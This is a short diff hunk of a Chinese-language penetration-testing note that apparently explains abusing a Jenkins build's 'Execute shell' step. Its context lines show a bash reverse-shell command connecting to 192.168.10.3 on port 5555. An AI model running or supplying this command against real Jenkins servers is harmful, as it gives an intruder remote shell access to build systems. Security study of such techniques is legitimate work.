@@ -70,7 +70,7 @@ eder:vipsu
 
 ### 反弹方法 1：
 
-build 一个项目，在构建环境中选择 Execute shell，并保存以下反弹内容：
+build 一个项目，在构建环境 build 中选择 Add build step -> Execute shell，并保存以下反弹内容：
 
 ```
 /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.10.3/5555 0>&1"
